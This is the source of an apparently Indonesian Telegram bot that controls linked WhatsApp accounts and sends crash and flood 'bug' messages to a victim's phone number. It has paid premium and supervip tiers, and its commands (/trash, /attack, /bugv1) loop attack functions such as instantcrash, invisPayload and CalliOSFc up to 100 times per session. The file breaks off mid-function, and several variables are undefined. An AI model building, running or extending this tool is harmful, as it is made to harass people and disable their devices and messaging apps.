const config = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");
const {
  default: makeWASocket,
  DisconnectReason,
  useMultiFileAuthState,
  generateWAMessageFromContent,
  vGenerateWAMessageFromContent13,
} = require("@whiskeysockets/baileys");
const fs = require("fs");
const P = require("pino");
const axios = require("axios");


function isPremium(userId) {
  return premiumUsers.includes(userId.toString());
}
const cooldowns = new Map();
const COOLDOWN_TIME = 80 * 1000; // 60 detik
const crypto = require("crypto");
const path = require("path");
const token = config.BOT_TOKEN;
const chalk = require("chalk");
const bot = new TelegramBot(token, { polling: true });

const sessions = new Map();
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

      for (const botNumber of activeNumbers) {
        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        const sock = makeWASocket({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
            try {
            angeles.newsletterFollow("120363373008401043@newsletter");
             } catch (error) {
            console.error('Newsletter error:', error);
            }
              console.log(`Bot ${botNumber} terhubung!`);
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,`
┏─────────────────
│     *START*    
│╭────────────
││Bot: ${botNumber}
││Status: Inisialisasi..
│╰────────────
┗─────────────────
`,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(`
┏─────────────────
│ *RECONNECTING* 🔄
│╭────────────
││Bot: ${botNumber}
││Status: Menghubungkan. .
│╰────────────
┗─────────────────
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(`
┏─────────────────
│*CONNECTION FAILED*
│╭────────────
││Bot: ${botNumber}
││Status: Tidak terhubung!
│╰────────────
┗─────────────────
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(`
┏─────────────────
│   *CONNECTED* ✅
│╭────────────
││Bot: ${botNumber}
││Status: Berhasil terhubung!
│╰────────────
┗─────────────────
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber);
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(`\`\`\`
┏─────────────────
│   CODE PAIRING    
│╭────────────
││Bot: ${botNumber}
││Kode: ${formattedCode}
│╰────────────
┗─────────────────
\`\`\``,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(`
┏─────────────────
│         *ERROR*    
│╭────────────
││Bot: ${botNumber}
││Pesan: ${error.message}
│╰────────────
┗─────────────────
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}

async function initializeBot() {
}
    
function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const senderName = msg.from.username ? 
  `@${msg.from.username}` : `${senderId}`;

  // Kirim pesan dengan video dan tombol channel
  bot.sendPhoto(chatId, "https://files.catbox.moe/kyuysw.jpg", {
    caption: `
┏───────────────────────────⊰
│ꪶ ⟐ ꫂ      𝕲𝖚𝖆𝖗𝖉𝖎𝖆𝖓 𝖔𝖋 𝕬𝖓𝖌𝖊𝖑ͯ       ꪶ ⟐ ꫂ
┗─⊰

𝘽𝙤𝙩𝙉𝙖𝙢𝙚 : guardian of Angel 
𝘾𝙧𝙚𝙖𝙩𝙤𝙧 : @Wanzjb2
𝙑𝙚𝙧𝙨𝙞𝙤𝙣 : 𝐕
𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝘽𝙤𝙩 : ${sessions.size}

⳼ Haii 👋, ada yg bisa aku bantu? ⳹


ㅤ    𝗕𝗨𝗚                 𝗠𝗘𝗡𝗨
  ⋆──────── 𓅯 ────────⋆
  ༼  /trash     ༟      628xx ༽
 ༼  /attack    ༟      628xx   ༽
  ⋆─────────────────────⋆

┏────────────────⊰
│  「  𝗢𝗪𝗡𝗘𝗥 𝗠𝗘𝗡𝗨  」
│⋋──────────────⋌
│┎──────
││╭▸ /cekidgw
││╰▸ /cekpremgw
│┖──────
│┎──────
││╭▸ /connect
││├▸ /listprem
││╰▸ /listbot
│┖──────
│┎──────
││╭▸ /addprem ༝ ɪᴅ
││╰▸ /delprem ༝ ɪᴅ
││╭▸ /addsupervip ༝ ɪᴅ
││╰▸ /delsupervip ༝ ɪᴅ
│┖──────
│
│┎──────
││╭▸ /bugv1
││╰▸ /bugv2
││╭▸ /buttonv1
││╰▸ /buttonv2
│┖──────
╰────────────────⊰
`,
    reply_markup: {
      inline_keyboard: [
        [{ text: "⌜ Owner Chat ⌟", url: "https://t.me/Wanzjb2" }],
      ],
    },
  });
});

bot.on("callback_query", async (callbackQuery) => {
  const data = callbackQuery.data;
  const chatId = callbackQuery.message.chat.id;
  const messageId = callbackQuery.message.message_id;

  // Jawab callback query untuk menghindari error
  await bot.answerCallbackQuery(callbackQuery.id);

  try {
    // Hapus pesan lama
    await bot.deleteMessage(chatId, messageId);
  } catch (error) {
    console.error("Error saat menghapus pesan:", error);
  }
});

const supervipFile = path.resolve("./supervipUsers.js");
let supervipUsers = require("./supervipUsers.js");

function isSupervip(userId) {
  return supervipUsers.includes(userId.toString());
}

bot.onText(/\/trash (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isPremium(userId) && !isSupervip(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }

  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;

  bot.sendVideo(chatId, "https://files.catbox.moe/enu27a.mp4", {
    caption: `
━━━━━━━━━━━━━━━━━━━━━━⟡
  ꪶ 𖦲 ꫂ  𝐓𝐀𝐑𝐆𝐄𝐓 𝐋𝐎𝐂𝐊 🔒  ꪶ 𖦲 ꫂ

𝐓𝐀𝐑𝐆𝐄𝐓 : *${formattedNumber}*
━━━━━━━━━━━━━━━━━━━━━━⟡
⚠ Bug tidak akan berjalan, apabila
sender bot memakai WhatsApp Business!`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "ꪶ 𝐗 ꫂ𝐅ͯ𝐎̻͜𝐑𝐂̻ͮ𝐄 ͜ ͠𝐂̻͜𝐋𝐒ͯཀ͡  ͜", callback_data: `ᱮXforceCLS_${target}` },
          { text: "ㅹ͜ 𝐄̻𝐗ͮ͢𝐄𝐂𝐔̻ͯ𝐓͢𝐈𝐎̻𝐍ͮ ͠ཀ⋆", callback_data: `ᱮExecution_${target}` },
          { text: "ᨒཀ𝐕̻ͮ𝐀͢ ͠𝐔ͣ𝐋͜𝐓ͣ𝐃̻͢ ͠𝐎𝐗̻ͯ ͠⿻", callback_data: `ᱮVaultDox_${target}` }
        ],
        [
          { text: "⃟𝐃ͮ͢͠𝐑𝚯̻𝐈ͯ𝐃 ͜ 𝐙̻𝐀ͣ͢͠𝐏༑ᄰ", callback_data: `ᱮDroidZap_${target}` },
          { text: "Ϟ̻𝐇ͯ͢𝐀͠𝐑͕ͯ𝐃͢͡𝐔ͯ𝐈", callback_data: `ᱮHardUi_${target}` }
        ],
        [
          { text: "𐁘̻𝐊ͯ𝐈̻𝐋ͮ𝐋 ͢𝐈𝐎ͯ𝐒⃟༑", callback_data: `ᱮKillIos_${target}` },
          { text: "⟠𝐃͢͠𝐑𝚯𝐈ͯ𝐃 ͜ 𝐗 ͜ 𝐈𝚯͢͠𝐒⛼", callback_data: `ᱮDroidXIos_${target}` },
          { text: "ᄓ̻𝐈͠𝐎̻𝐒 ͜ 𝐙𝐀͢͠𝐏ᄰᆣ", callback_data: `ᱮIosZap_${target}` },
        ],
        [
          { text: "ᄓ̻𝐓ͮͯ͜͡𝐑ͮ͢𝐀𝐕̻ͯ͠𝐀͢𝐙𝐀ͮͯ͜͡𝐏", callback_data: `ᱮTravaZap_${target}` }
        ]
      ],
    },
  });
});

bot.on("callback_query", async (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;
  const data = callbackQuery.data;
  const userId = callbackQuery.from.id;

    if (!isPremium(userId) && !isSupervip(userId)) {
    return bot.sendMessage(chatId, `
❌ Proses Bug Dibatalkan!
Pastikan ID anda sudah dalam daftar premium`, { parse_mode: "Markdown" });
  }

  const [bugType, target] = data.split("_");

  const bugTypes = {
    "ᱮXforceCLS": [bug1],
    "ᱮExecution": [bug1],
    "ᱮVaultDox": [bug1],
    "ᱮDroidZap": [bug2],
    "ᱮHardUi": [bug2],
    "ᱮKillIo": [bug3],
    "ᱮDroidXIos": [bug3],
    "ᱮIosZap": [bug4],
    "ᱮTravaZap": [bug5]
  };

  if (!bugTypes[bugType]) {
    return;
  }

  if (sessions.size === 0) {
    return bot.sendMessage(chatId, "‼️ Tidak ada bot WhatsApp yang terhubung\nProses Bug Dibatalkan!");
  }

  bot.answerCallbackQuery(callbackQuery.id);

  let successCount = 0;
  let failCount = 0;

  for (const [botNum, sock] of sessions.entries()) {
    try {
      if (!sock.user) {
        console.log(`Bot ${botNum} tidak terhubung, mencoba menghubungkan ulang...`);
        await initializeWhatsAppConnections();
        continue;
      }
      for (const bugFunction of bugTypes[bugType]) {
        await bugFunction(sock, target);
      }
      successCount++;
    } catch (error) {
      failCount++;
    }
  }

  bot.sendMessage(
    chatId,`
\`\`\`HASILNYA
┏─────────────────
│ 𝗧𝘆𝗽𝗲 𝗕𝘂𝗴
│ ${bugType}
│╭────────────
││Target: ${target}
││Berhasil: ${successCount}
││Gagal: ${failCount}
││Total Bot: ${sessions.size}
│╰────────────
┗─────────────────\`\`\``,
    { parse_mode: "Markdown" }
  );
});

bot.onText(/\/attack (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isPremium(userId) && !isSupervip(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ *ＡＫＳＥＳ ＤＩＴＯＬＡＫ*\nAnda tidak memiliki izin untuk menggunakan perintah ini.",
      { parse_mode: "Markdown" }
    );
  }

  const targetNumber = match[1].replace(/[^0-9]/g, ""); // Hanya angka
  const target = `${targetNumber}@s.whatsapp.net`;

  bot.sendVideo(chatId, "https://files.catbox.moe/enu27a.mp4", {
    caption: `
━━━━━━━━━━━━━━━━━━━━━━⟡
  ꪶ 𖦲 ꫂ  𝐓𝐀𝐑𝐆𝐄𝐓 𝐋𝐎𝐂𝐊 🔒  ꪶ 𖦲 ꫂ

𝐓𝐀𝐑𝐆𝐄𝐓 : *${formattedNumber}*
━━━━━━━━━━━━━━━━━━━━━━⟡
⚠ Ｆｉｔｕｒ ｔｉｄａｋ ａｋａｎ ｂｅｒｊａｌａｎ ｊｉｋａ ｂｏｔ ｍｅｎｇｇｕｎａｋａｎ ＷｈａｔｓＡｐｐ Ｂｕｓｉｎｅｓｓ！`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "⟦ Ｆｏｒｃｅ Ｌｏｃｋ ⟧", callback_data: `ForceLock_${target}` },
          { text: "⟦ Ｅｘｅｃｕｔｉｏｎ Ｍｏｄｅ ⟧", callback_data: `ExecutionMode_${target}` },
          { text: "⟦ Ｓｅｃｕｒｅ Ｖａｕｌｔ ⟧", callback_data: `SecureVault_${target}` }
        ],
        [
          { text: "⟦ Ｄｒｏｉｄ Ａｔｔａｃｋ ⟧", callback_data: `DroidAttack_${target}` },
          { text: "⟦ Ｓｙｓｔｅｍ Ｏｖｅｒｒｉｄｅ ⟧", callback_data: `SystemOverride_${target}` }
        ],
        [
          { text: "⟦ Ｓｙｓｔｅｍ Ｗｉｐｅ ⟧", callback_data: `SystemWipe_${target}` },
          { text: "⟦ Ｃｒｏｓｓ Ｍｏｄｅ ⟧", callback_data: `CrossMode_${target}` },
          { text: "⟦ Ｐｒｏｔｏｃｏｌ Ｂｒｅａｋ ⟧", callback_data: `ProtocolBreak_${target}` }
        ],
        [
          { text: "⟦ Ｆｉｎａｌ Ｓｔｒｉｋｅ ⟧", callback_data: `FinalStrike_${target}` }
        ]
      ],
    },
  });
});

bot.on("callback_query", async (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;
  const data = callbackQuery.data;
  const userId = callbackQuery.from.id;

  if (!isPremium(userId) && !isSupervip(userId)) {
    return bot.sendMessage(chatId, `
❌ *ＰＲＯＳＥＳ ＤＩＢＡＴＡＬＫＡＮ！*
Pastikan ID Anda sudah dalam daftar premium.`, { parse_mode: "Markdown" });
  }

  const [bugType, target] = data.split("_");

  const bugTypes = {
    "ForceLock": [bug1],
    "ExecutionMode": [bug1],
    "SecureVault": [bug1],
    "DroidAttack": [bug2],
    "SystemOverride": [bug2],
    "SystemWipe": [bug3],
    "CrossMode": [bug3],
    "ProtocolBreak": [bug4],
    "FinalStrike": [bug5]
  };

  if (!bugTypes[bugType]) {
    return;
  }

  if (sessions.size === 0) {
    return bot.sendMessage(chatId, "‼️ *ＴＩＤＡＫ ＡＤＡ ＢＯＴ ＷＡ ＴＥＲＨＵＢＵＮＧ*\nProses Dibatalkan!");
  }

  bot.answerCallbackQuery(callbackQuery.id);

  let successCount = 0;
  let failCount = 0;

  for (const [botNum, sock] of sessions.entries()) {
    try {
      if (!sock.user) {
        console.log(`Bot ${botNum} tidak terhubung, mencoba menghubungkan ulang...`);
        await initializeWhatsAppConnections();
        continue;
      }
      for (const bugFunction of bugTypes[bugType]) {
        await bugFunction(sock, target);
      }
      successCount++;
    } catch (error) {
      failCount++;
    }
  }

  bot.sendMessage(
    chatId,`
\`\`\`
ＲＥＰＯＲＴ ＥＫＳＥＫＵＳＩ
┏━━━━━━━━━━━━━━━━━
┃ ＴＹＰＥ ＢＵＧ
┃ ${bugType}
┃--------------------
┃ ＴＡＲＧＥＴ: ${target}
┃ ＳＵＫＳＥＳ: ${successCount}
┃ ＧＡＧＡＬ: ${failCount}
┃ ＴＯＴＡＬ ＢＯＴ: ${sessions.size}
┗━━━━━━━━━━━━━━━━━
\`\`\``,
    { parse_mode: "Markdown" }
  );
});

bot.onText(/\/bugv1 (.+)/, (msg, match) => {
   const chatId = msg.chat.id;
 
 if (!isPremium(userId) && !isSupervip(userId)) {
    return bot.sendMessage(
      chatId,
      "❌ *Akses Ditolak*\nLu Bukan premium sana minta add sama owner.",
      { parse_mode: "Markdown" }
    );
 }

    const targetNumber = match[1].replace(/[^0-9]/g, "");
    
    const target = `${targetNumber}@s.whatsapp.net`;

bot.sendVideo(chatId, "https://files.catbox.moe/enu27a.mp4", {
    caption: `
━━━━━━━━━━━━━━━━━━━━━━⟡
  ꪶ 𖦲 ꫂ  𝐓𝐀𝐑𝐆𝐄𝐓 𝐋𝐎𝐂𝐊 🔒  ꪶ 𖦲 ꫂ

𝐓𝐀𝐑𝐆𝐄𝐓 : *${formattedNumber}*
━━━━━━━━━━━━━━━━━━━━━━⟡
⚠ Bug tidak akan berjalan, apabila
sender bot memakai WhatsApp Business!`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "𝕱𝖔𝖗𝖈𝖊𝕮𝖑𝖔𝖘𝖊", callback_data: `ForceClose_${target}` },
          { text: "𝕰𝖃𝕴𝕿𝕴𝕺𝕹", callback_data: `EXITION_${target}` },
          { text: "𝕾𝖊𝖈𝖚𝖗𝖊𝖁𝖆𝖚𝖑𝖙", callback_data: `SecureVault_${target}` }
        ],
        [
          { text: "⟦ Ｄｒｏｉｄ Ａｔｔａｃｋ ⟧", callback_data: `DroidAttack_${target}` },
          { text: "⟦ Ｓｙｓｔｅｍ Ｏｖｅｒｒｉｄｅ ⟧", callback_data: `SystemOverride_${target}` }
        ],
        [
          { text: "⟦ Ｓｙｓｔｅｍ Ｗｉｐｅ ⟧", callback_data: `SystemWipe_${target}` },
          { text: "⟦ Ｃｒｏｓｓ Ｍｏｄｅ ⟧", callback_data: `CrossMode_${target}` },
          { text: "⟦ Ｐｒｏｔｏｃｏｌ Ｂｒｅａｋ ⟧", callback_data: `ProtocolBreak_${target}` }
        ],
        [
          { text: "⟦ Ｆｉｎａｌ Ｓｔｒｉｋｅ ⟧", callback_data: `FinalStrike_${target}` }
        ]
      ],
    },
  });
});

bot.on("callback_query", async (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;
  const data = callbackQuery.data;
  const userId = callbackQuery.from.id;

  if (!isPremium(userId) && !isSupervip(userId)) {
    return bot.sendMessage(chatId, `
❌ *ＰＲＯＳＥＳ ＤＩＢＡＴＡＬＫＡＮ！*
Pastikan ID Anda sudah dalam daftar premium.`, { parse_mode: "Markdown" });
  }

  const [bugType, target] = data.split("_");

  const bugTypes = {
    "ForceClose": [bug1],
    "EXITION": [bug1],
    "SecureVault": [bug1],
    "DroidAttack": [bug2],
    "SystemOverride": [bug2],
    "SystemWipe": [bug3],
    "CrossMode": [bug3],
    "ProtocolBreak": [bug4],
    "FinalStrike": [bug5]
  };

  if (!bugTypes[bugType]) {
    return;
  }

  if (sessions.size === 0) {
    return bot.sendMessage(chatId, "‼️ *ＴＩＤＡＫ ＡＤＡ ＢＯＴ ＷＡ ＴＥＲＨＵＢＵＮＧ*\nProses Dibatalkan!");
  }

  bot.answerCallbackQuery(callbackQuery.id);

  let successCount = 0;
  let failCount = 0;

  for (const [botNum, sock] of sessions.entries()) {
    try {
      if (!sock.user) {
        console.log(`Bot ${botNum} tidak terhubung, mencoba menghubungkan ulang...`);
        await initializeWhatsAppConnections();
        continue;
      }
      for (const bugFunction of bugTypes[bugType]) {
        await bugFunction(sock, target);
      }
      successCount++;
    } catch (error) {
      failCount++;
    }
  }

  bot.sendMessage(
    chatId,`
\`\`\`
ＲＥＰＯＲＴ ＥＫＳＥＫＵＳＩ
┏─────────────────
│ 𝗧𝘆𝗽𝗲 𝗕𝘂𝗴
│ ${bugType}
│╭────────────
││Target: ${target}
││Berhasil: ${successCount}
││Gagal: ${failCount}
││Total Bot: ${sessions.size}
│╰────────────
┗─────────────────
\`\`\``,
    { parse_mode: "Markdown" }
  );
});
       
bot.onText(/\/addsupervip (.+)/, (msg, match) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "‼️ *Akses Ditolak*\nHanya pemilik bot yang dapat menambah pengguna supervip.",
      { parse_mode: "Markdown" }
    );
  }

  const newUserId = match[1].replace(/[^0-9]/g, "");

  if (!newUserId) {
    return bot.sendMessage(chatId, "❌ Mohon masukkan ID pengguna yang valid.");
  }

  if (supervipUsers.includes(newUserId)) {
    return bot.sendMessage(
      chatId,
      "✅ Pengguna sudah terdaftar sebagai supervip."
    );
  }

  supervipUsers.push(newUserId);

  const fileContent = `const supervipUsers = ${JSON.stringify(
    supervipUsers,
    null,
    2
  )};\n\nmodule.exports = supervipUsers;`;

  fs.writeFile(supervipFile, fileContent, (err) => {
    if (err) {
      console.error("Gagal menulis ke file:", err);
      return bot.sendMessage(
        chatId,
        "‼️ Terjadi kesalahan saat menyimpan pengguna ke daftar supervip."
      );
    }

    bot.sendMessage(
      chatId,
      `✅ Berhasil menambahkan ID ${newUserId} ke daftar supervip.`
    );
  });
});

bot.onText(/\/delsupervip (.+)/, (msg, match) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "‼️ *Akses Ditolak*\nHanya pemilik bot yang dapat menghapus pengguna supervip.",
      { parse_mode: "Markdown" }
    );
  }

  const userIdToRemove = match[1].replace(/[^0-9]/g, "");

  if (!supervipUsers.includes(userIdToRemove)) {
    return bot.sendMessage(
      chatId,
      "❌ Pengguna tidak ditemukan dalam daftar supervip."
    );
  }

  supervipUsers = supervipUsers.filter((id) => id !== userIdToRemove);

  const fileContent = `const supervipUsers = ${JSON.stringify(
    supervipUsers,
    null,
    2
  )};\n\nmodule.exports = supervipUsers;`;

  fs.writeFile(supervipFile, fileContent, (err) => {
    if (err) {
      console.error("Gagal menulis ke file:", err);
      return bot.sendMessage(
        chatId,
        "‼️ Terjadi kesalahan saat menghapus pengguna dari daftar supervip."
      );
    }

    bot.sendMessage(
      chatId,
      `✅ Berhasil menghapus ID ${userIdToRemove} dari daftar supervip.`
    );
  });
});

bot.onText(/\/listprem/, (msg) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "‼️ *Akses Ditolak*\nHanya pemilik bot yang dapat melihat daftar pengguna premium.",
      { parse_mode: "Markdown" }
    );
  }

  const premiumList = premiumUsers
    .map((id, index) => `${index + 1}. ${id}`)
    .join("\n");

  bot.sendMessage(
    chatId,
    `Daftar User Premium:\n${premiumList || "Saat ini tidak ada user premium."}`,
    { parse_mode: "Markdown" }
  );
});


// Perintah untuk mengecek status ID dan Premium
bot.onText(/\/cekidgw/, (msg) => {
    const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const senderName = msg.from.username ? 
  `@${msg.from.username}` : `${senderId}`;
    

  return bot.sendMessage(
      chatId,`
\`\`\`𝙎𝙪𝙘𝙘𝙚𝙨𝙨✅
𝗜𝗗 𝗧𝗘𝗟𝗘𝗚𝗥𝗔𝗠 𝗔𝗡𝗗𝗔

𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲 : ${senderName}
𝗜𝗗 : ${senderId}\`\`\``,
      { parse_mode: "Markdown" }
    );
});

bot.onText(/\/cekpremgw/, (msg) => {
  const chatId = msg.chat.id;

  if (!isPremium(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "🙁 *Yahh kamu belum premium*\nSilakan chat owner untuk upgrade ke premium.",
      { parse_mode: "Markdown" }
    );
  }

  bot.sendMessage(chatId, "🥳 Yeayy Anda sekarang memiliki akses ke fitur premium.");
});

const premiumFile = path.resolve("./premiumUsers.js");
let premiumUsers = require("./premiumUsers.js");

bot.onText(/\/addprem (.+)/, (msg, match) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id) && !isSupervip(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "‼️ *Akses Ditolak*\nHanya pemilik bot dan user vip yang dapat menambah pengguna premium.",
      { parse_mode: "Markdown" }
    );
  }

  const newUserId = match[1].replace(/[^0-9]/g, "");

  if (!newUserId) {
    return bot.sendMessage(chatId, "❌ Mohon masukkan ID pengguna yang valid.");
  }

  if (premiumUsers.includes(newUserId)) {
    return bot.sendMessage(chatId, "✅ Pengguna sudah terdaftar sebagai premium.");
  }

  premiumUsers.push(newUserId);

  const fileContent = `const premiumUsers = ${JSON.stringify(
    premiumUsers,
    null,
    2
  )};\n\nmodule.exports = premiumUsers;`;

  fs.writeFile(premiumFile, fileContent, (err) => {
    if (err) {
      console.error("Gagal menulis ke file:", err);
      return bot.sendMessage(
        chatId,
        "‼️ Terjadi kesalahan saat menyimpan pengguna ke daftar premium."
      );
    }

    bot.sendMessage(
      chatId,
      `✅ Berhasil menambahkan ID ${newUserId} ke daftar premium.`
    );
  });
});

bot.onText(/\/delprem (.+)/, (msg, match) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id) && !isSupervip(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "❌ *Akses Ditolak*\nHanya pemilik bot dam user vip yang dapat menghapus pengguna premium.",
      { parse_mode: "Markdown" }
    );
  }

  const userIdToRemove = match[1].replace(/[^0-9]/g, "");

  if (!premiumUsers.includes(userIdToRemove)) {
    return bot.sendMessage(
      chatId,
      "❌ Pengguna tidak ditemukan dalam daftar premium."
    );
  }

  premiumUsers = premiumUsers.filter((id) => id !== userIdToRemove);

  const fileContent = `const premiumUsers = ${JSON.stringify(
    premiumUsers,
    null,
    2
  )};\n\nmodule.exports = premiumUsers;`;

  fs.writeFile(premiumFile, fileContent, (err) => {
    if (err) {
      console.error("Gagal menulis ke file:", err);
      return bot.sendMessage(
        chatId,
        "‼️ Terjadi kesalahan saat menghapus pengguna dari daftar premium."
      );
    }

    bot.sendMessage(
      chatId,
      `✅ Berhasil menghapus ID ${userIdToRemove} dari daftar premium.`
    );
  });
});

bot.onText(/\/listbot/, async (msg) => {
  const chatId = msg.chat.id;

  if (!isOwner(msg.from.id) &&!isSupervip(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "❌ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "‼️ Kamu belum menghubungkan bot satupun. Silakan hubungkan bot terlebih dahulu menggunakan /connect"
      );
    }

    let botList =
      "╭─────────────────⟢\n│       *LIST BOT*    \n│⋋──────────────⋌\n";
    let index = 1;

    for (const [botNumber, sock] of sessions.entries()) {
      const status = sock.user ? "Terhubung" : "Tidak Terhubung";
      botList += `│ ${index}. ${botNumber}\n│    Status: ${status}\n│\n`;
      index++;
    }

    botList += `│ Total: ${sessions.size} bot\n╰─────────────────⟢`;

    await bot.sendMessage(chatId, botList, { parse_mode: "Markdown" });
  } catch (error) {
    console.error("Error in listbot:", error);
    await bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat mengambil daftar bot. Silakan coba lagi."
    );
  }
});

bot.onText(/\/connect (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id) && !isSupervip(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "❌ *Akses Ditolak*\nHanya pengguna bot dan user vip untuk menggunakan fitur ini",
      { parse_mode: "Markdown" }
    );
  }
  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in addbot:", error);
    bot.sendMessage(
      chatId,
      "‼️ Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});

//~~~~~~~~~~~~~~~~~~~FUNTION UMPAN BALIK ZEUS~~~~~~~~~~~~~~~~~~~~\\

async function bug1(sock, target) {
     for (let i = 0; i < 100; i++) {
         await instantcrash(sock, target);
         }
     }

async function bug2(sock, target) {
      for (let i = 0; i < 15; i++) {
          await trashinfinity(sock, target);
          await invisPayload(sock, target);
          await trashdevice(sock, target);
          }
      for (let i = 0; i < 15; i++) {
           await indictiveUI(sock, target);
           await indictiveUI(sock, target);
           }
      }

async function bug3(sock, target) {
      for (let i = 0; i < 8; i++) {
          await indictiveUI(sock, target);
          await trashinfinity(sock, target);
          await trashdevice(sock, target);
          }
      for (let i = 0; i < 7; i++) {
          await delayforceMessage(sock, target);
          await invc2(sock, target);
          await QDIphone(sock, target);
          await indictive_notif(sock, target);
          await QPayIos(sock, target);
          await QPayStriep(sock, target);
          await indictive_notif(sock, target);
          await CalliOSFc(sock, target, Ptcp = true);
          await invc2(sock, target);
          }
      }
      
async function bug4(sock, target) {
      for (let i = 0; i < 10; i++) {
          await invc2(sock, target);
          await CalliOSFc(sock, target, Ptcp = true);
